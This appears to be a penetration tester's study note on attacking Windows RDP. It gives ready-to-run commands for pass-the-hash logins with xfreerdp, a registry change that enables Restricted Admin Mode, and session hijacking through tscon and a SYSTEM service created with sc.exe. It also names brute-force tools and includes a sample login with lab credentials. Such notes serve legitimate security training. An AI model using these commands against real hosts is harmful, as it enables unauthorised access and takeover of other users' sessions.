---
tags:
  - PtH
---
Port: TCP/UDP 3389
Script: `rdp*`
_Note: `--packet-trace`_ for better inspection

>**!!** RDP cookies (`mstshash=nmap`) used by Nmap to interact with the RDP server can be identified by `threat hunters`,Endpoint Detection and Response (`EDR`), etc.

>\> Windows system don't insist but they might accept inadequate encryption via [RDP Security](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/8e8b2cca-c1fa-456c-8ecb-a82fc60b2322).
>\> Self-signed certificates only warn the client at user-end

# Pass the Hash
```shell-session
$ xfreerdp /v:<IP> /u:<USER> /pth:<NT-HASH>
```
>**NOTE:** `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, the following error shows:
>![[rdp_session-4.webp]]
>To enable, add a new registry key `DisableRestrictedAdmin` (REG_DWORD) under the LSA Registry with the value of 0.

```cmd-session
CMD > reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
# Session Hijack
If we RDP'd to an account with SYSTEM privileges, we can hijack other user's active RDP session
```CMD
> query user
> tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>
```
If we only have Local Administrator rights, we can use [[PsExec]] or [[Mimikatz]]. We need to create a service that runs as `Local System` and will execute any binary with `SYSTEM` privileges.
```CMD
> query user
> sc.exe create sessionhijack binpath= "cmd.exe /k tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>"
> net start sessionhijack
```
>**!! NOTE:** This doesn't work since Windows Server 2019.


# Bruteforce
## Tools
- [[Hydra]]
- [[Crowbar]]
# Tools
- [[RDP-Sec-checks]] by Cisco CX Security Labs
- [[rdesktop]]
- [[xfreerdp]]
```shell-session
$ xfreerdp /u:'cry0l1t3' /p:'P455w0rd!' /v:10.129.201.248
```

